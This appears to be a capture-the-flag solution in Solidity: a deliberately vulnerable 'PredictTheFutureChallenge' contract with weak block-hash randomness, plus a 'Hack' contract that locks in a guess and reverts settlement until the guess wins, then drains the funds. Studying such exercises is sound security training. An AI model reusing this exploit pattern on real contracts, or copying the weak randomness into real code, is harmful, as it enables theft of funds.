// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == address(0));
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        ) % 10;

        guesser = address(0);
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract Hack {
    PredictTheFutureChallenge predictContract;

    constructor(address _predictContract) {
        predictContract = PredictTheFutureChallenge(_predictContract);
    }

    receive() external payable {}

    function guess(uint8 answer) public payable {
        require(answer >= 0 && answer <= 9);
        predictContract.lockInGuess{value: 1 ether}(answer);
    }

    function attack() public {
        predictContract.settle();
        require(predictContract.isComplete(), "Try again");
        payable(msg.sender).transfer(address(this).balance);
    }

    function showBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
